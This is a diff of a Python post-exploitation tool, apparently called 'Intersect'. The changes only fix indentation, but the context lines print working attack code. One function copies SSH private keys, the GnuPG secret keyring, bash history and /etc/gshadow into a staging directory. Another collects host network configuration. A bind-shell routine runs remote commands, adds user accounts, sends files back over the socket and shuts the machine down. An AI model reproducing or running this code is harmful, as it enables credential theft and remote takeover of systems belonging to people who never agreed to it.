@@ -229,15 +229,15 @@ def GetCredentials():
     if os.path.isfile(Home_Dir+'/.ssh/id_dsa.pub') is True:
         shutil.copy2(Home_Dir+'/.ssh/id_dsa.pub', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_rsa') is True:
-         shutil.copy2(Home_Dir+'/.ssh/id_rsa', Temp_Dir+"/credentials/")
+        shutil.copy2(Home_Dir+'/.ssh/id_rsa', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_rsa.pub') is True: 
-         shutil.copy2(Home_Dir+'/.ssh/id_rsa.pub', Temp_Dir+"/credentials/")
+        shutil.copy2(Home_Dir+'/.ssh/id_rsa.pub', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.gnupg/secring.gpg') is True:
-           shutil.copy2(Home_Dir+'/.gnupg/secring.gpg', Temp_Dir+"/credentials/")
+        shutil.copy2(Home_Dir+'/.gnupg/secring.gpg', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+"/.ssh/authorized_keys") is True:
-           shutil.copy2(Home_Dir+'/.ssh/authorized_keys', Temp_Dir+"/credentials/")  
+        shutil.copy2(Home_Dir+'/.ssh/authorized_keys', Temp_Dir+"/credentials/")  
     if os.path.isfile(Home_Dir+"/.ssh/known_hosts") is True:               
-          shutil.copy2(Home_Dir+'/.ssh/known_hosts', Temp_Dir+"/credentials/")
+        shutil.copy2(Home_Dir+'/.ssh/known_hosts', Temp_Dir+"/credentials/")
     shutil.copy2(Home_Dir+'/.bash_history', Temp_Dir+"/credentials/bash_history.txt")
     if os.path.isfile("/etc/gshadow") is True:
         shutil.copy2("/etc/gshadow", Temp_Dir+"/credentials/")
@@ -283,11 +283,11 @@ def NetworkInfo():
    os.system("rm localIP.txt hostname.txt ifconfig.txt")
 
    if os.path.exists("/etc/hosts.deny") is True:
-        shutil.copy2("/etc/hosts.deny", networkdir)
+       shutil.copy2("/etc/hosts.deny", networkdir)
    if os.path.exists("/etc/hosts.allow") is True:
-        shutil.copy2("/etc/hosts.allow", networkdir)
+       shutil.copy2("/etc/hosts.allow", networkdir)
    if os.path.exists("/etc/inetd.conf") is True:
-        shutil.copy2("/etc/inetd.conf", networkdir)
+       shutil.copy2("/etc/inetd.conf", networkdir)
                
 def NetworkMap():
    # Combine ARP then portscan. Send IPs to list and iterate through for the scan
@@ -552,8 +552,8 @@ def bindShell():
              )
         stdout, stderr = proc.communicate()
         if cmd.startswith('cd'):
-             os.chdir(cmd[3:].replace('\n',''))
-             conn.send("\nIntersect"+str(os.getcwd())+" $ ")
+            os.chdir(cmd[3:].replace('\n',''))
+            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
         elif cmd.startswith('adduser'):
             strip = cmd.split(" ")
             acct = strip[1]
@@ -576,13 +576,13 @@ def bindShell():
             strip = cmd.split(" ")
             filename = strip[1]
             if not os.path.isfile(filename):
-                 conn.send("[!] File not found on host! Check the filename and try again.")
+                conn.send("[!] File not found on host! Check the filename and try again.")
             if os.path.isfile(filename):
-                 fileopen=file(filename, "rb")
-                 file_data=""
-                 for data in fileopen:
-                       file_data += data
-                       conn.sendall(file_data)
+                fileopen=file(filename, "rb")
+                file_data=""
+                for data in fileopen:
+                    file_data += data
+                    conn.sendall(file_data)
         elif cmd.startswith("rebootsys"):
              conn.send("[!] Server system is going down for a reboot!")
              os.system("shutdown -h now")
